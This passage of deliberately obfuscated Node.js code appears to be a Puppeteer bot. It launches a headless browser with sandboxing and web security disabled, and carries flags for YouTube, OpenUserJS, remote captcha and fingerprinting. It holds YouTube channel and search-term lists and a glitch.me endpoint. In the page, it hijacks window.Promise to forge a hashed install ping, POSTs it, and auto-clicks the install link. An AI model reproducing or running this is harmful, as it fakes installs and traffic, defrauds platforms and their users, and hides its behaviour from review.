                J[0x5d8 + -0x1828 * -0x1 + -0x1df0] = this['block'], J[K >> -0x1665 + -0x1 * 0x13cd + 0x49 * 0x94] |= x[0x1 * 0x21a9 + 0x3 * 0x69d + -0x1 * 0x357d & K], this['block'] = J[-0x1348 + -0xc99 + 0x1ff1], K >= -0xf0 + -0x4 * -0x1f0 + 0x1a6 * -0x4 && (this['hashed'] || this['hash'](), J[-0xd3 * 0x18 + -0x20e8 + 0x34b0] = this['block'], J[0xb2 * -0x1d + 0x1 * 0x1cf + -0x1 * -0x126b] = J[-0x2af * -0x3 + -0x3 * 0x709 + 0xd0f * 0x1] = J[-0x5 * -0x613 + -0x2b6 * -0x7 + 0x2e7 * -0x11] = J[0x123b + 0x1526 + -0x1 * 0x275e] = J[-0x20c + 0x5 * 0x3fe + -0x11e6] = J[-0x1222 + -0x1 * 0x74d + 0x87c * 0x3] = J[-0x5a4 + -0x19e + 0x3a4 * 0x2] = J[0x2071 + 0x2f * -0xe + -0x1dd8] = J[0x9 * 0xf1 + 0xa49 * -0x2 + 0xc21] = J[-0xedb + 0x1a40 + 0xb5c * -0x1] = J[0xd * -0x29d + 0xa * 0x2bf + -0x3 * -0x22f] = J[0xd5 * -0x5 + -0x42a + -0x66 * -0x15] = J[-0x26f5 + -0x15c2 + 0x11 * 0x393] = J[0xcb6 * 0x2 + -0x1c6 * -0x14 + -0x8b1 * 0x7] = J[-0xd8a + 0x1cc2 + -0xf2a] = J[0x1337 + 0x4 * 0x332 + -0x92 * 0x38] = 0x85b + -0x19e9 + 0x118e), J[-0x1315 + -0x3 * 0x4bd + 0x2 * 0x10ad] = this['hBytes'] << -0x85d * -0x1 + -0x1d90 + 0xf * 0x16a | this['bytes'] >>> 0x2e9 * -0x2 + -0x603 + 0x1 * 0xbf2, J[-0x1b51 + -0x2298 + 0x3df8] = this['bytes'] << -0x53 * -0x67 + -0xc76 * 0x2 + 0x13 * -0x72, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x720 + -0x216f + -0x9d * -0x2b; J < -0x1afd + 0xb7e + 0x3 * 0x545; ++J)
                K = Q[J - (-0x2 * 0xac9 + 0x15b6 + -0x21)] ^ Q[J - (-0x9cd * 0x3 + -0xaad + 0x281c)] ^ Q[J - (0x152b + 0x1 * -0xafd + 0x51 * -0x20)] ^ Q[J - (0x1 * 0x26a5 + -0xdd9 + 0x18bc * -0x1)], Q[J] = K << 0x1 * -0x22bd + 0x1f3c + 0x382 | K >>> -0x25d3 * -0x1 + 0x544 + 0x16 * -0x1f4;
              for (J = -0xf * -0x209 + 0x1 * 0x715 + -0x259c; J < 0x1447 * -0x1 + 0x1655 + -0x1fa; J += 0x52f * 0x2 + -0x10d9 * 0x1 + 0x680)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x102b + 0x1 * 0x16e + 0xec2 | L >>> -0x20ef + -0x2 * -0x305 + 0x240 * 0xc) + (M & N | ~M & O) + P + (0x45949d4b + -0x85b1c9d * -0xa + -0x33b85e * 0x136) + Q[J] << -0x1 * 0x2326 + -0x3 * 0x6f5 + 0x1 * 0x3805) << 0x4a + -0x1 * 0x1b4a + 0x1b05 | P >>> -0x19e2 + -0x5c1 + 0x1 * 0x1fbe) + (L & (M = M << 0x1 * -0x10a8 + -0x716 * -0x1 + 0x9b0 | M >>> -0xdf8 + -0x94e * -0x1 + 0x4ac) | ~L & N) + O + (-0x4fccb2bc + 0x684998ce + 0x42059387) + Q[J + (-0x92c + -0x6 * -0x2 + 0x921)] << 0x23d0 + -0xffb * -0x2 + -0x43c6) << -0x192d * -0x1 + -0x1da7 + 0x47f * 0x1 | O >>> -0x13 * -0x90 + -0x4ec + -0x5a9) + (P & (L = L << 0x15dd + 0x113 * -0x14 + -0x43 | L >>> 0x1 * 0x564 + -0x13bf + 0xe5d) | ~P & M) + N + (-0x9b05eae3 + -0x6c7aa885 + 0x162030d01) + Q[J + (0x25be + 0x22d1 + 0x488d * -0x1)] << 0x1bf * 0x9 + 0xb0e + 0x4d * -0x59) << 0x18ea + -0x12 * 0x167 + 0x59 | N >>> 0x20de + -0xc3d * 0x2 + 0x7 * -0x12f) + (O & (P = P << 0x31c * 0x8 + -0xc46 + -0x2f * 0x44 | P >>> -0x1d2 * 0xb + -0xae * -0x13 + 0x71e) | ~O & L) + M + (-0x1fb2afd4 + -0x13825b64 + -0x6588d * -0x1655) + Q[J + (-0x47 * -0x15 + -0x25 * 0xb8 + 0x14c8)] << 0x667 * 0x5 + 0x1163 * -0x1 + -0xea0) << 0x1 * -0x62 + -0x197d + 0x679 * 0x4 | M >>> -0x1adc + -0x63c * -0x1 + -0x3 * -0x6e9) + (N & (O = O << -0x1b64 + -0x71a + -0x1bb * -0x14 | O >>> 0x6df + 0x25e9 * -0x1 + 0x1f0c) | ~N & P) + L + (-0x89857efe + -0x99cbfd88 + 0x17dd3f61f) + Q[J + (-0x1848 + 0x1 * -0x4fd + 0x1d49)] << 0x127f + -0x15a6 + 0x327 * 0x1, N = N << -0x5e9 * 0x5 + -0x1 * 0x1df + 0x1f8a | N >>> -0x11b * -0x7 + 0x2b * -0x71 + 0xb40;
              for (; J < -0x15a6 * 0x1 + 0x1e57 + -0x889; J += -0x14b5 + -0x29e + -0x18 * -0xf9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xa7c + 0x5 * 0x3cb + -0x1d6e | L >>> -0x1 * 0x18dd + -0xd23 + 0x261b) + (M ^ N ^ O) + P + (-0x1254af4f + 0x572 * 0xdf403 + 0x3533e29a) + Q[J] << 0x13 * 0x1b7 + 0xff7 + -0x308c) << -0x17ec + -0x148c * 0x1 + 0x7 * 0x65b | P >>> -0xfa + 0x1f7 * -0x2 + 0x503) + (L ^ (M = M << -0x254a + 0x2 * -0x702 + -0x4 * -0xcdb | M >>> -0x2026 + 0x25f9 * 0x1 + -0x5d1) ^ N) + O + (-0x29dd1 * 0x1cd + -0x6738c1c1 * 0x1 + 0x3 * 0x48ed9f95) + Q[J + (-0x4 * -0x13 + -0x1 * 0x4eb + 0x4a0)] << 0x5 * -0x691 + 0x1 * 0x377 + 0x1d5e) << 0x214b + -0x19cd + -0x779 | O >>> 0x1 * -0x2246 + -0x57 + 0x115c * 0x2) + (P ^ (L = L << 0x12e5 + -0x623 * -0x4 + -0x2b53 | L >>> -0x1ce9 + 0x1fd4 + -0x5 * 0x95) ^ M) + N + (-0xd7b355d1 * -0x1 + 0x7041aa2a * 0x1 + -0x2c9b23 * 0x4de) + Q[J + (0x89f * -0x4 + -0x182 + 0x900 * 0x4)] << 0x1 * 0xc82 + -0x6b0 + -0x5d2) << -0xf81 + 0x2cd * -0x1 + -0x1 * -0x1253 | N >>> -0xc23 * 0x1 + -0x354 * 0x1 + 0xf92) + (O ^ (P = P << 0x1697 + -0x79c + 0x2f9 * -0x5 | P >>> -0x182 * -0xd + -0x6b0 + 0xce8 * -0x1) ^ L) + M + (0x5db * 0x8911f + -0x4d121ff7 + 0x1b8d4237 * 0x5) + Q[J + (0x98c + -0x3f6 + -0x593)] << -0x1b * 0x6a + -0x5 * -0x5f3 + -0x1291) << 0xe3e + 0x1e6c + 0xb * -0x40f | M >>> 0x2 * 0x496 + 0x8a6 + 0x11b7 * -0x1) + (N ^ (O = O << 0x89 * 0x1f + 0xf6e + -0x1fe7 | O >>> -0x1533 + -0x188d + 0x2dc2) ^ P) + L + (0x3956a7c7 + 0xb882b374 + -0x261bc36 * 0x37) + Q[J + (0xbdf + -0x3ad * -0x2 + 0x21 * -0x95)] << -0x10b1 * -0x1 + 0xa21 * -0x3 + -0xdb2 * -0x1, N = N << 0x21bf + -0x3 * -0x393 + -0x1 * 0x2c5a | N >>> -0x1cf7 + -0xd33 + 0x2a2c;
              for (; J < 0x261 + -0x23de + 0x21b9; J += -0x5d9 + -0x7 * 0x2f5 + -0x1a91 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xbdf * 0x1 + -0x2467 * -0x1 + -0x3041 * 0x1 | L >>> -0x53 * 0xd + 0x58 * -0x2a + 0x7 * 0x2ae) + (M & N | M & O | N & O) + P - (-0x4e9d188d + -0x22750773 + -0x29ff6 * -0x5616) + Q[J] << 0x2612 + -0x71f + -0x1ef3) << -0x1 * -0x25d + 0x8e1 * 0x1 + -0xa9 * 0x11 | P >>> 0xec4 + -0x65 * 0x5 + -0x38 * 0x3a) + (L & (M = M << 0x13e0 + 0x1163 * 0x1 + -0x2525 | M >>> -0x1ba * -0xb + -0x37 * -0x4a + 0x1171 * -0x2) | L & N | M & N) + O - (0x2cf14706 * 0x1 + 0xdd * 0x76b879 + -0xb836c1d * 0x3) + Q[J + (-0x5 * 0x197 + -0x99c + 0x1 * 0x1190)] << 0xda9 + -0xbcc * -0x3 + -0x310d) << -0x1b * -0x14b + 0x335 * 0x4 + 0x2fb8 * -0x1 | O >>> -0x133d * -0x2 + -0x14fb + -0x1164) + (P & (L = L << -0x1e22 + -0x13 * -0x12 + 0x1cea * 0x1 | L >>> -0x22f * -0x7 + 0x6d * -0x4 + -0x8b * 0x19) | P & M | L & M) + N - (-0x1217 * 0x69340 + -0x9a8061ec + 0x1e46 * 0xcc2f8) + Q[J + (0xdc2 + -0xde1 + 0x1 * 0x21)] << -0x1f0a + -0x257b + 0x4485) << -0x26dd + -0x2458 + 0x4b3a | N >>> -0xf9a * 0x2 + -0x256 * -0x5 + 0x4b * 0x43) + (O & (P = P << -0x1fa6 * -0x1 + 0x26e1 * 0x1 + 0x5 * -0xe15 | P >>> -0x13ed + -0x842 + 0x407 * 0x7) | O & L | P & L) + M - (0x3cd * 0x14b622 + -0x524ee9d0 + 0x747aedba) + Q[J + (-0x8e * 0x17 + -0x216b + -0x2e3 * -0x10)] << -0x1bc5 + 0x1e31 * -0x1 + 0x6 * 0x9a9) << -0xa8c + 0x7 * -0x436 + 0x280b * 0x1 | M >>> -0xef4 * 0x1 + 0x35 * 0x5b + -0x4 * 0xf2) + (N & (O = O << 0x3bd * -0x7 + -0x21bc + -0x3c05 * -0x1 | O >>> -0x227 * -0xb + -0x4c * -0x6b + -0x1 * 0x376f) | N & P | O & P) + L - (-0x1 * 0x7cb68f5d + -0x4829b89 * 0x1d + -0xb8333883 * -0x2) + Q[J + (-0x131 + 0xc1d + -0xae8)] << 0x11c0 + -0x13ff + 0x19 * 0x17, N = N << -0xb1 + -0x21 * -0xc9 + -0xc8d * 0x2 | N >>> -0x1 * 0x15d7 + 0x6 * -0x607 + 0x1 * 0x3a03;
              for (; J < -0x8f9 * -0x1 + -0x2f * -0x31 + -0x11a8 * 0x1; J += -0x924 + 0x1 * -0x7c + -0x1 * -0x9a5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x13d1 + -0x7c * -0x3b + -0x3060 | L >>> 0x257f + 0x55b + -0x2abf) + (M ^ N ^ O) + P - (-0x554d5fda + 0x2 * 0x518a5a1 + -0x16916 * -0x5b43) + Q[J] << 0x1 * 0x2029 + 0x191e + -0x535 * 0xb) << -0xa * 0x3a3 + -0x812 + -0x1 * -0x2c75 | P >>> -0x1649 + 0x1 * -0xa4e + 0xae6 * 0x3) + (L ^ (M = M << -0x2cf * 0x5 + 0x750 + 0x6d9 | M >>> -0x288 + -0xd0a * -0x2 + -0x178a) ^ N) + O - (-0xb4ef124 + 0x117ba340 + 0x1 * 0x2f708c0e) + Q[J + (0x1725 * 0x1 + 0x6fe + 0x196 * -0x13)] << -0x4f * -0x78 + 0x21c2 + -0x215 * 0x22) << -0x1ece + 0x5 * 0x104 + 0x19bf | O >>> 0x107c + -0x232e + 0x12cd) + (P ^ (L = L << 0x1ae3 * -0x1 + 0x26ba + -0xbb9 | L >>> -0x557 * 0x2 + 0x13f * 0xe + -0x6c2) ^ M) + N - (-0x363860a + -0x4e88d4e * -0x4 + 0x255e8efc) + Q[J + (-0x774 + -0x1 * -0x1b0a + -0x1394)] << 0x2069 + -0x217b + 0x112) << -0xad * -0x13 + 0x2ad + -0xf7f * 0x1 | N >>> -0x13 * 0x16f + 0x3 * 0x74b + 0x577) + (O ^ (P = P << 0x2016 + -0x81b + 0x29 * -0x95 | P >>> 0x185 * 0x12 + -0x2d * 0xbf + -0x1d * -0x37) ^ L) + M - (-0x5 * 0x3a79a2b + 0x397d01db + -0xe663f26 * -0x1) + Q[J + (0x1835 + -0x10ee + -0x3 * 0x26c)] << 0x35b * -0x2 + -0x1 * -0xe0f + -0x759) << 0x1 * 0x7b2 + 0x1c1f + 0x2 * -0x11e6 | M >>> -0xb * 0x14c + 0x1796 + -0x1 * 0x937) + (N ^ (O = O << 0x1274 + 0x20d5 + -0x332b | O >>> -0x1623 + -0x24f5 + 0x3b1a) ^ P) + L - (0x159e76b * 0x49 + 0xf4a7b23 + -0x29650c * 0x175) + Q[J + (-0x21b3 + -0x13ae + 0x3565)] << 0x260f + 0x15d1 + 0x8 * -0x77c, N = N << -0x25d4 + -0x12f8 + 0x5b1 * 0xa | N >>> -0x128f + 0xe * -0x1cd + -0x7 * -0x641;
              this['h0'] = this['h0'] + L << -0x607 * -0x1 + -0xb17 + 0x510, this['h1'] = this['h1'] + M << -0x1e63 + 0x2bb * 0x9 + -0x174 * -0x4, this['h2'] = this['h2'] + N << 0x192d + 0x1e41 + -0x376e, this['h3'] = this['h3'] + O << 0x10b1 + -0x2 * 0x6a1 + 0x125 * -0x3, this['h4'] = this['h4'] + P << -0x3f6 * 0x1 + 0xb41 * -0x1 + 0xf37;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x10ad * -0x2 + 0x697 * 0x1 + -0x1adf * -0x1 & 0x2 * -0xe71 + 0x432 * -0x3 + 0x2987] + w[J >> 0x1 * 0x143e + -0x22a0 + 0xe7a & -0x1 * -0x20d4 + -0x1add * -0x1 + 0x3ba2 * -0x1] + w[J >> -0x455 * 0x6 + 0x1 * -0x370 + -0x3 * -0x9d6 & 0x945 + -0x874 + -0xc2] + w[J >> -0x6ed + -0x26fc + -0x3 * -0xf53 & 0x305 * 0x6 + -0xec1 * -0x1 + 0x15e * -0x18] + w[J >> 0x3d6 + -0x1 * -0x12a1 + -0x166b & 0x76 * -0x21 + -0x10b2 + -0x1ff7 * -0x1] + w[J >> -0x2507 + -0x32 * -0xa3 + -0xbf * -0x7 & 0x23f1 + -0x2a1 * -0x7 + -0x3649] + w[J >> 0x1 * 0xae5 + 0x447 + -0xf28 & -0x1 * 0x3fa + -0x25d0 + 0x29d9] + w[-0x1 * 0xbcf + 0x1 * -0x1ae3 + 0x26c1 & J] + w[K >> 0x5 * 0x648 + 0x8 * 0x3cb + -0x3da4 & 0x39 * -0x21 + 0x1ca5 * -0x1 + 0x347 * 0xb] + w[K >> 0x6a8 + 0x2473 + 0x8f * -0x4d & 0x4 * 0x92c + 0x1ffa + -0x449b] + w[K >> -0xf3a + 0xa68 + -0x72 * -0xb & 0x531 + 0x1 * -0x25cf + 0x20ad] + w[K >> -0x2054 + 0x35 * 0x35 + 0x1 * 0x156b & -0x1a90 + -0x487 + 0x1f26] + w[K >> 0x1 * -0x1f39 + 0x1 * -0x22d9 + 0x421e & 0x108f + -0x11dd * 0x2 + 0x133a] + w[K >> 0x2fd + 0x93a + 0xc2f * -0x1 & -0xb1c * -0x1 + -0x14c9 + 0x9bc] + w[K >> 0xf65 + 0x7db + -0x173c & -0x221b + -0x8 * 0x3e0 + 0x412a] + w[-0x2e7 + 0x155f * 0x1 + -0x1269 & K] + w[L >> -0xf51 + -0x203a + 0x2fa7 & 0x1165 * 0x1 + 0x508 + 0x1 * -0x165e] + w[L >> 0x7f0 + -0xa3c + 0x3 * 0xcc & 0x3 * -0x24a + 0x14cb * -0x1 + 0x1bb8] + w[L >> 0xc * -0xd + -0x1e63 + -0x1f13 * -0x1 & -0x751 * -0x5 + -0x1a8f + 0x1 * -0x9f7] + w[L >> -0x25ff + 0xe4d * -0x1 + 0x345c & -0x104d + 0x4 * -0x865 + 0x31f0] + w[L >> 0x23f6 + -0x5ad * 0x2 + -0x106 * 0x18 & -0x5 * 0x3 + 0x6d * -0x32 + -0xab4 * -0x2] + w[L >> 0x22 * 0xa6 + 0x24e0 + 0xeb9 * -0x4 & 0x1249 + 0x231b + -0x3555] + w[L >> 0x1b * -0x155 + -0x253 * 0xc + 0x53 * 0xc5 & 0x1f92 + 0x1fb3 + 0xba * -0x57] + w[-0xeb * -0x15 + 0x1ccd + -0x3005 & L] + w[M >> 0x1a8e + -0x1 * 0x195d + -0x115 * 0x1 & 0x779 * -0x1 + 0xcd0 * -0x1 + 0x1458] + w[M >> -0x2 * -0x5da + 0x1 * -0x199 + -0xa03 & 0x26a4 + -0x21 * -0xc2 + 0x49 * -0xdf] + w[M >> 0xe60 + -0x1eeb + 0x109f & -0x226 + 0x2140 + -0x1f0b] + w[M >> 0xa9d + 0x16d9 + 0x32 * -0xab & -0x1 * 0x131b + 0x2564 + -0x123a] + w[M >> 0xb1c + -0x1 * -0xcff + 0x1 * -0x180f & -0x9 * 0x71 + -0x31d + -0x1f * -0x3b] + w[M >> 0x20d + -0x640 * 0x3 + 0x10bb * 0x1 & -0x13c8 + -0x251b + 0x25 * 0x18a] + w[M >> -0x1eb9 + -0x3 * 0x99d + -0xf6 * -0x3e & 0x1 * 0x1587 + 0x3b * 0x12 + -0x199e] + w[0xcbf * -0x1 + 0x2247 + -0x1579 & M] + w[N >> 0xcd9 + -0xbd6 + -0x4d * 0x3 & 0x3 * -0x8df + -0x22 + 0x1ace] + w[N >> -0x2a5 * -0x1 + -0x227b + -0x2 * -0xff7 & -0x1cd * -0x5 + -0x83 * 0x26 + 0xa8 * 0x10] + w[N >> -0x543 + -0x1374 + 0x18cb & 0xaac + -0x2609 + 0x1b6c] + w[N >> 0xc0 * -0x20 + 0x1602 + -0x20e * -0x1 & -0x5d4 + -0x1fd * -0x7 + -0x808] + w[N >> 0x25d9 * 0x1 + 0xc3a * 0x2 + -0x3e41 & -0xe9 * -0x2 + 0x11 * 0x1c3 + -0x1fb6] + w[N >> 0xa4 * -0x2d + 0xcfc + 0x10 * 0xfe & -0x16b2 + -0x2109 * -0x1 + -0xa48] + w[N >> -0x2334 + -0x103 * 0x1d + 0x939 * 0x7 & -0x12f6 + 0x1382 + -0x7d] + w[0x14a + 0x6c1 * 0x1 + -0x7fc & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x24f1 + 0x168b + 0xb5 * -0x54 & -0x30 * 0x40 + -0x13cd + 0x20cc,
                J >> 0x227 + 0x1 * 0x1e13 + -0x202a & -0x2565 + 0x3b9 + 0x22ab,
                J >> 0x19d5 + 0x114f + -0x2b1c & -0x14d0 + -0x5 * 0x389 + -0x7 * -0x5a4,
                0xf51 + -0x26a9 + -0xc9 * -0x1f & J,
                K >> 0x1d9a + 0x2007 + -0x3d89 & -0x67b * 0x1 + 0x28 * 0x11 + 0x4d2,
                K >> 0x124c + -0x182 + -0x2 * 0x85d & 0xf7d + 0x1 * -0x1415 + 0x1dd * 0x3,
                K >> 0x13df + -0x9b3 * 0x1 + -0xa24 & -0x84a + 0x621 + 0x328,
                0x2 * -0xc3a + -0x5 * 0x5f3 + 0x3732 & K,
                L >> -0xd0 + 0x1d * 0x93 + -0xfbf & 0x140d + -0x247b + 0x116d,
                L >> -0x3e0 + -0x1948 + 0x1d38 & 0x1954 + 0x1 * -0x16eb + -0x16a,
                L >> -0x237c + -0xa3d * -0x1 + 0x1947 & -0x1709 * -0x1 + 0x35c * 0x7 + -0x11 * 0x2ae,
                0x1 * -0x189d + -0x7d9 + 0xb27 * 0x3 & L,
                M >> 0x12ea + 0x2284 + 0x1 * -0x3556 & -0x4 * -0x6e6 + -0x166d * 0x1 + 0x6 * -0xb2,
                M >> 0x1708 + -0x7c8 + -0x36 * 0x48 & 0x2bd * 0xb + 0x1 * 0x5be + -0x22de,
                M >> 0x649 * 0x2 + 0x22b3 + 0x3 * -0xfbf & 0x1cb3 * 0x1 + -0xe87 + 0xd2d * -0x1,
                -0x2 * -0x273 + 0x2408 + 0x1 * -0x27ef & M,
                N >> 0x1627 + 0x191 * -0xf + 0x170 & 0xad4 + -0x24be * 0x1 + 0x1ae9,
                N >> 0x1007 * 0x1 + -0x167 * -0x1 + -0x115e & -0x1 * -0x18ea + 0x1b81 * -0x1 + 0x1b * 0x22,
                N >> -0x1 * 0x21f5 + 0x13 * -0xb8 + 0x2fa5 & 0x892 * -0x4 + -0x1852 * -0x1 + 0x21 * 0x55,
                -0x1bb4 + -0x10af * -0x1 + -0x602 * -0x2 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x377 * -0xb + -0x1 * -0x51 + 0x2 * 0x12f0), (K = new DataView(J))['setUint32'](-0x7d7 + -0x4 * -0x51b + -0xc95, this['h0']), K['setUint32'](0x15 * 0x3f + -0x1173 + -0x1 * -0xc4c, this['h1']), K['setUint32'](-0x1af * 0x16 + -0x19d7 + 0x3ee9, this['h2']), K['setUint32'](0x11 * -0x77 + -0x119f + 0x1992, this['h3']), K['setUint32'](-0x8 * -0x49a + -0x1e * 0x62 + -0x1944, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G[W(0x16)]['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x13b6 + 0x17e0 + 0x2 * -0x215];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1127 + -0xa92 + -0x695;
            J[0x1 * -0x12dd + -0xf00 + -0x21dd * -0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x893 * -0x2 + 0xaf3 * -0x2 + -0x682 * -0x6] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x3 * 0x51a + -0x1d81 + 0x6 * 0x778), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xa * 0xf2 + 0x15 * -0x4f + -0x2f8;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x5eb + 0x99f * -0x1 + 0x1566), Promise['resolve'](0x2513 * 0x1 + -0x1b * 0x7b + 0xc7 * -0x1f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1778 + 0x9db * 0x1 + 0x55 * 0x29; j < -0x1ba4 + 0x8ef * -0x1 + 0x2494; j++)
    i();
}
const NETWORK_PATIENCE = -0x1cd * 0x14 + 0x22e2 + 0x2 * 0x1031 + (0x1bce + 0x1d63 + 0x7 * -0x67f) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x4 * -0x16a + 0x1 * 0x4bd + 0xee) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x3 * 0xca + 0x24cd * -0x1 + 0x226f * 0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1112 + 0x2236 + -0x19a4 * 0x2);
    let h = e[f];
    return h;
  }, d(b, c);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + X(0x15) + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 